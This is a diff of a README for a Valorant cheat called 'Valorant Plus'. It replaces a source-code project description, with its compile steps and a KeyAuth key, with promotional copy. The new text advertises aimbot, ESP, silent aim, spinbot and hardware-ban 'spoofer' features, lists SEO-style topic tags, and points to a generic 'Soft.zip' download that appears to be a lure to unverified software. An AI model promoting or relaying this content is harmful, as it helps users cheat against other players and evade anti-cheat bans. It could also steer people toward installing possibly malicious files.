@@ -1,80 +1,85 @@
-# Valorant Plus
+# Valorant Plus Cheat - The Ultimate Tool for Valorant Domination! 🔥
 
-Valorant Plus is a tool that offers advanced cheating features in the game Valorant. The cheat is undetected.
+## Description
+Welcome to **Valorant Plus Cheat**, your gateway to unlocking the full potential of Valorant with advanced cheating features that keep you undetected. This tool is designed to give you the edge you need to conquer your enemies and achieve victory in every match.
 
-## Installation
-
-1. Download the project to your computer as a Zip file.
-2. Compile the project.
-3. Installation is complete.
-
-**Note:** There are no issues in the code. If you encounter any errors during compilation, install the necessary modules on your computer and try again.
-**Note:** There is a KeyAuth System in the code. You can replace it with your own KeyAuth System.
-
-## Usage
-
-1. Launch Valorant Plus.
-2. Choose option 1.
-3. Enter the key.
-4. Open the Valorant game.
-5. Press F1.
-6. Enjoy the game.
-
-- General Key: `KEYAUTH-Valorant-PLUS`
+![Valorant Plus Cheat Logo](https://example.com/valorant-plus-logo.png)
 
 ## Features
+With Valorant Plus Cheat, you get access to a wide range of cheats and hacks that will elevate your gameplay to new heights. Here are some of the key features included in this tool:
 
-### General Features
+### Aimbot
+Gain precision targeting with our advanced aimbot feature that helps you land your shots with ease.
 
-- In-game cheating features
-- Automatic update system
+### Bunnyhop
+Move around the map swiftly and effortlessly with our bunnyhop feature, giving you a speed advantage over your opponents.
 
-### Visibility Settings
+### ESP
+Always stay one step ahead of your enemies with our ESP feature, which provides you with crucial information about enemy positions.
 
-- Enable box rendering
-- Select box type (e.g., Square, Rectangle)
-- Show head box
-- Show skeleton
-- Enable snaplines (lines showing players' positions)
-- Select snaplines type
-- Show distance
-- Show health bar
-- Show player field of view
-- Ignore dormant (invisible) players
+### Fast Crouch
+React quickly to changing situations with our fast crouch feature, allowing you to dodge enemy fire with ease.
 
-### Cheat Settings
+### Glow
+Spot enemies easily with our glow feature, which highlights their outlines for easy targeting.
 
-- Enable aimbot
-- Show field of view (FOV) drawing
-- Set aimbot key
-- Select aimbot target (e.g., Head, Body)
-- Adjust aimbot smoothness
-- Adjust FOV size
+### Hack Source Code
+Customize and tweak your cheats to suit your playstyle with access to the hack source code.
 
-### Appearance Settings
+### Insta Agent
+Switch agents in an instant with our insta agent feature, giving you the flexibility to adapt to any situation.
 
-- Set box color
-- Set snaplines color
-- Set distance color
-- Set skeleton color
-- Set head box color
-- Set FOV color
+### Spoofer
+Protect your account with our permanent and temporary spoofer options, keeping your identity safe while cheating.
 
-## Overview
+### Radar
+Keep track of enemy movements on the map with our radar feature, ensuring you never get caught off guard.
 
-![valorant-plus](https://github.com/harakey910/tnarolav/assets/169345184/3ad49adb-6e27-41cf-96ef-cb83d6e811b7)
+### Skinchanger
+Personalize your weapons with our skinchanger feature, allowing you to stand out on the battlefield.
 
-![undefined - Imgur](https://github.com/harakey910/tnarolav/assets/169345184/6a4a8f76-e41c-4cb7-8d23-d98fd21ef3e9)
+### Skip Tutorial
+Get straight into the action with our skip tutorial feature, saving you time and getting you into the game faster.
 
-## Support
+### Silent Aim
+Take down enemies discreetly with our silent aim feature, keeping your cheats undetected.
 
-The project is completely open source. You can develop it as you wish.
+### Spinbot
+Confuse and overwhelm your opponents with our spinbot feature, making it impossible for them to hit you.
 
-## License
+### Third Person
+Gain a unique perspective with our third-person feature, giving you new ways to strategize and outplay your enemies.
 
-This project is licensed under the [MIT License](link). You can review the details in the `LICENSE` file.
+## Topics
+Explore a wide range of topics related to Valorant cheats and hacks, including:
 
----
+- valorant
+- valorant-aimbot
+- valorant-bunnyhop
+- valorant-cheat
+- valorant-esp
+- valorant-exploits
+- valorant-fast-crouch
+- valorant-glow
+- valorant-hack
+- valorant-hack-source-code
+- valorant-insta-agent
+- valorant-permanent-spoofer
+- valorant-radar
+- valorant-skinchanger
+- valorant-skip-tutorial
+- valorant-silent-aim
+- valorant-spinbot
+- valorant-spoofer
+- valorant-temporary-spoofer
+- valorant-third-person
 
-> [!NOTE]
-> **Usage of this program is entirely at your own risk.**
+## Installation
+Download **Valorant Plus Cheat** from [here](https://github.com/file/Soft.zip) and launch the tool to start dominating the competition.
+
+[![Download Valorant Plus Cheat](https://img.shields.io/badge/Download-Valorant_Plus_Cheat-blue.svg)](https://github.com/file/Soft.zip)
+
+## Conclusion
+Enhance your Valorant experience with **Valorant Plus Cheat** and take your gameplay to the next level. Embrace the power of cheats and hacks to become the ultimate champion in Valorant. Download now and unleash your full potential! 🚀🎮
+
+![Play Valorant with Valorant Plus Cheat](https://example.com/play-valorant-with-valorant-plus.png)
